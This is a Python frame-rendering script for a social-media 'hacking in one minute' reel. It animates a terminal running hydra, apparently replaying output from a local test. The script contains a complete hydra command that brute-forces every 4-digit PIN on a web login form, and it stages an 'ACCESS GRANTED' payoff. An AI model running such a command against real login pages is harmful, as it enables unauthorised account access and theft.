#!/usr/bin/env python3
# Terminal-session reel player: black slides + a scrolling terminal that types a
# command and streams real tool output, ending on a payoff. Reel #1 = hydra.
import os, re, math
from PIL import Image, ImageDraw, ImageFont

OUT = "frames_hydra"; os.makedirs(OUT, exist_ok=True)
W, H, FPS = 1080, 1920, 30

# ---- palette (easy on the eye) ----
BLACK=(0,0,0)
TERM_BG=(11,17,32); CHROME=(14,22,38); BORDER=(34,48,74)
TXT=(205,227,255); DIM=(95,114,145); CYAN=(79,209,255)
GREEN=(61,220,132); AMBER=(255,194,74); RED=(255,92,108); PROMPT=(61,220,132)
SLIDE_TX=(242,246,255)

MONO="/System/Library/Fonts/Menlo.ttc"
SANS="/System/Library/Fonts/HelveticaNeue.ttc"
def ft(path,sz):
    try: return ImageFont.truetype(path,sz)
    except Exception: return ImageFont.load_default()
f_code=ft(MONO,20); f_title=ft(MONO,20); f_big=ft(MONO,34)
f_slide=ft(SANS,78); f_slide_sm=ft(SANS,34); f_slide_xs=ft(MONO,28)

# ---- window geometry ----
WIN_X,WIN_W=40,1000
WIN_Y,WIN_H=150,1620
TITLE_H=56
PADX,PADY=20,16
BODY_X=WIN_X+PADX; BODY_Y=WIN_Y+TITLE_H+PADY
BODY_W=WIN_W-2*PADX; BODY_H=WIN_H-TITLE_H-2*PADY
CW=f_code.getlength("M")            # ~12
LINE_H=26
MAXCH=int(BODY_W/CW)
VIS=int(BODY_H/LINE_H)-2            # visible body lines (leave room for progress bar)

DOMAIN="hacking.beamreach.ai"

# ---- load real hydra output, cleaned for display ----
raw=open("hydra_raw.txt").read().splitlines()
lines=[]
for ln in raw:
    ln=ln.replace("127.0.0.1:8899",DOMAIN).replace("127.0.0.1",DOMAIN)
    ln=ln.replace(":8899","")
    if ln.strip(): lines.append(ln)
# find the success line index
succ=next(i for i,l in enumerate(lines) if "password:" in l)
stream=lines[:succ+1]
tail=lines[succ+1:succ+3]          # STATUS + summary

def color_for(ln):
    if "password:" in ln or "valid pair" in ln or "successfully completed" in ln: return GREEN
    if ln.startswith("[ATTEMPT]"): return DIM
    if ln.startswith("[DATA]") or ln.startswith("[STATUS]"): return CYAN
    if ln.startswith("[ERROR]"): return RED
    return TXT

def clip(s): return s if len(s)<=MAXCH else s[:MAXCH-1]+"…"

# ---- drawing helpers ----
def chrome(d):
    d.rounded_rectangle((WIN_X,WIN_Y,WIN_X+WIN_W,WIN_Y+WIN_H),radius=16,fill=CHROME,outline=BORDER,width=2)
    cy=WIN_Y+TITLE_H//2
    for k,c in enumerate([(255,95,86),(255,189,46),(39,201,63)]):
        cx=WIN_X+24+k*24; d.ellipse((cx-6,cy-6,cx+6,cy+6),fill=c)
    t="root@kali: ~ — %s" % DOMAIN
    tb=d.textbbox((0,0),t,font=f_title)
    d.text((WIN_X+(WIN_W-(tb[2]-tb[0]))//2,cy-(tb[3]-tb[1])//2-2),t,font=f_title,fill=DIM)
    d.line((WIN_X,WIN_Y+TITLE_H,WIN_X+WIN_W,WIN_Y+TITLE_H),fill=BORDER,width=1)

def base():
    im=Image.new("RGB",(W,H),BLACK); d=ImageDraw.Draw(im); chrome(d)
    d.rectangle((WIN_X+2,WIN_Y+TITLE_H+1,WIN_X+WIN_W-2,WIN_Y+WIN_H-2),fill=TERM_BG)
    return im,d

def draw_lines(d, rows, cursor=False):
    """rows: list of (text,color). Bottom-anchored block of up to VIS rows."""
    rows=rows[-VIS:]
    for i,(t,c) in enumerate(rows):
        y=BODY_Y+i*LINE_H
        d.text((BODY_X,y),clip(t),font=f_code,fill=c)
    if cursor and rows:
        y=BODY_Y+(len(rows)-1)*LINE_H
        x=BODY_X+f_code.getlength(clip(rows[-1][0]))+3
        d.rectangle((x,y+2,x+CW-2,y+LINE_H-5),fill=TXT)

def progress(d, frac, label):
    y=WIN_Y+WIN_H-30; x0=BODY_X; x1=BODY_X+BODY_W
    d.rectangle((x0,y,x1,y+8),fill=(22,32,52))
    d.rectangle((x0,y,x0+int((x1-x0)*frac),y+8),fill=AMBER)
    d.text((x0,y-24),label,font=f_code,fill=AMBER)

idx=0
def save(im):
    global idx; im.save(f"{OUT}/f{idx:04d}.png"); idx+=1

# ---- slides ----
def slide(main, accent=None, sub=None, kicker=None, frames=30, accent_color=GREEN):
    im=Image.new("RGB",(W,H),BLACK); d=ImageDraw.Draw(im)
    cy=H//2
    if kicker:
        kb=d.textbbox((0,0),kicker,font=f_slide_xs)
        d.text(((W-(kb[2]-kb[0]))//2,cy-190),kicker,font=f_slide_xs,fill=accent_color)
    # main (optionally with one accent word colored)
    words=main.split(" ")
    # measure full line
    full=main
    fb=d.textbbox((0,0),full,font=f_slide); fw=fb[2]-fb[0]
    # multiline wrap if too wide
    maxw=W-120
    import textwrap
    def wrap(s):
        out=[]; cur=""
        for w in s.split(" "):
            test=(cur+" "+w).strip()
            if d.textbbox((0,0),test,font=f_slide)[2]<=maxw: cur=test
            else: out.append(cur); cur=w
        if cur: out.append(cur);
        return out
    ls=wrap(full)
    total_h=len(ls)*92
    y=cy-total_h//2
    for line in ls:
        lb=d.textbbox((0,0),line,font=f_slide); lw=lb[2]-lb[0]
        x=(W-lw)//2
        d.text((x,y),line,font=f_slide,fill=SLIDE_TX)
        if accent and accent in line:
            # recolor the accent word
            pre=line.split(accent)[0]
            ax=x+d.textbbox((0,0),pre,font=f_slide)[2]
            d.text((ax,y),accent,font=f_slide,fill=accent_color)
        y+=92
    if sub:
        sb=d.textbbox((0,0),sub,font=f_slide_sm)
        d.text(((W-(sb[2]-sb[0]))//2,y+24),sub,font=f_slide_sm,fill=DIM)
    for _ in range(frames): save(im)

# ===================== TIMELINE =====================
# slide 0 (1s), title (2s)
slide("1-MINUTE HACKING", accent="HACKING", kicker="// ep.01", frames=30)
slide("Bruteforcing a weak password", sub="4-digit PIN · 10,000 combos · real tool", frames=60)

# ---- terminal: type the command ----
CMD1='hydra -l admin -x 4:4:1 -t 16 %s \\' % DOMAIN
CMD2='      http-post-form "/login:username=^USER^&pin=^PASS^:F=Invalid"'
full_cmd=CMD1+"\n"+CMD2
TYPE_FRAMES=40
for fr in range(TYPE_FRAMES):
    n=round((fr+1)/TYPE_FRAMES*len(full_cmd))
    sub=full_cmd[:n]
    parts=sub.split("\n")
    rows=[("❯ "+parts[0], TXT)]
    if len(parts)>1: rows.append((parts[1],TXT))
    im,d=base(); draw_lines(d,rows,cursor=True); save(im)
# hold command 8 frames
for _ in range(8):
    im,d=base(); draw_lines(d,[("❯ "+CMD1,TXT),(CMD2,TXT)],cursor=True); save(im)

# ---- stream hydra output ----
header=[("❯ "+CMD1,TXT),(CMD2,TXT),("",TXT)]
STREAM_FRAMES=360
N=len(stream)
for fr in range(STREAM_FRAMES):
    shown=min(N, max(1, round((fr+1)/STREAM_FRAMES*N)))
    cur=stream[:shown]
    rows=header+[(l,color_for(l)) for l in cur]
    # progress from "X of 10000"
    frac=shown/N
    m=re.search(r"(\d+) of 10000", cur[-1]) if cur else None
    cnt=int(m.group(1)) if m else int(frac*1362)
    im,d=base(); draw_lines(d,rows)
    progress(d, min(cnt/1362,1.0), "cracking… %d / 10000 pins" % cnt)
    save(im)

# ---- payoff: found line emphasized + ACCESS GRANTED ----
found=[l for l in stream if "password:" in l][0]
for hold in range(70):
    im,d=base()
    rows=header+[(l,color_for(l)) for l in stream[-(VIS-8):]]
    draw_lines(d,rows)
    # big banner
    by=WIN_Y+WIN_H-230
    d.rounded_rectangle((BODY_X,by,BODY_X+BODY_W,by+150),radius=10,fill=(8,28,18),outline=GREEN,width=2)
    blink = (hold//6)%2==0
    d.text((BODY_X+24,by+22),("● ACCESS GRANTED" if blink else "  ACCESS GRANTED"),font=f_big,fill=GREEN)
    d.text((BODY_X+24,by+78),"admin : 1342     balance $284,500",font=f_code,fill=TXT)
    save(im)

# outro
slide("Follow for more", accent=None, sub="comment · share · subscribe", kicker="// 1-minute hacking", frames=60)

print("total frames:", idx, "=> %.1fs" % (idx/FPS))
